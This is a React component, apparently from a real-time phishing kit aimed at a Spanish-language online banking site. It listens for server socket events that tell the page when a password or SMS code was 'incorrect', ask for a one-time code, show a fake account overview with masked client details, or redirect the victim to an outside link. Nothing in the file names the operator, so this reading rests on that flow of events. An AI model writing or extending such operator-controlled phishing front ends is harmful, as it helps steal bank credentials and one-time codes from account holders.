// SocketListener.js
import { useEffect } from "react";
import { useSocket } from "./SocketContext";
import {
  sError,
  sLoading,
  sOdesk,
  sPassword,
  sHomeDesk,
  sVerify,
  sOpenCode,
  sChecked,
  sLoad,
} from "../features/users/usersSlice";
import { useNavigate } from "react-router-dom";
import { link } from "./settings";

function SocketListener({ dispatch }) {
  const { currentSocket: socket } = useSocket();
  const navigate = useNavigate();

  useEffect(() => {
    if (!socket) return;

    const handlePage = (e) => {
      dispatch(sLoading({ l: false }));
      switch (e.p) {
        case -1:
          dispatch(sPassword({ p: false }));
          break;
        case 0:
          dispatch(sPassword({ p: true }));
          break;
        case 1:
          dispatch(
            sHomeDesk({
              name: "Usuario",
              dateName: "************",
              clientNumber: "**************",
              descript: "**************",
            })
          );
          navigate("/main/posicionconsolidada");
          dispatch(sOdesk({ oD: true }));
          dispatch(sChecked({ ck: "sms" }));
          break;
        case 2:
          dispatch(sVerify({ v: true }));
          break;
        default:
          break;
      }
    };

    const handleIncorrect = () => {
      dispatch(sPassword({ p: false }));
      dispatch(sError({ e: true }));
      dispatch(sLoading({ l: false }));
    };

    const handleIncorrectSms = () => {
      dispatch(sOpenCode({ c: false }));
      dispatch(sError({ e: true }));
      dispatch(sLoading({ l: false }));
    }

    const handleEventMappings = [
      { event: "page", handler: handlePage },
      { event: "incorrect", handler: handleIncorrect },
      { event: "oDesk", handler: (e) => e && dispatch(sOdesk({ oD: true })) },
      { event: "verify", handler: (e) => e && dispatch(sVerify({ v: true })) },
      { event: "checked", handler: (e) => e && dispatch(sChecked(e)) },
      { event: "homeDesk", handler: (e) => e && dispatch(sHomeDesk(e)) },
      { event: "main", handler: () => {navigate("/main/posicionconsolidada");  dispatch(sLoad({ l: false }));}},
      { event: "openCode", handler: () => dispatch(sOpenCode({ c: true })) },
      { event: "incorrectSms", handler: handleIncorrectSms },
      { event: "redirect", handler: () => (window.location.href = link) },
      { event: "reloadClient", handler: () => window.location.reload() },
      { event: "updateSocket", handler: () => navigate("/login") },
      { event: "updateLogin", handler: () => dispatch(sLoading({ l: false })) },
    ];

    // Registrar eventos dinmicamente
    handleEventMappings.forEach(({ event, handler }) => socket.on(event, handler));

    return () => {
      // Limpieza de eventos
      handleEventMappings.forEach(({ event }) => socket.off(event));
    };
  }, [socket, dispatch, navigate]);

  return null;
}

export default SocketListener;
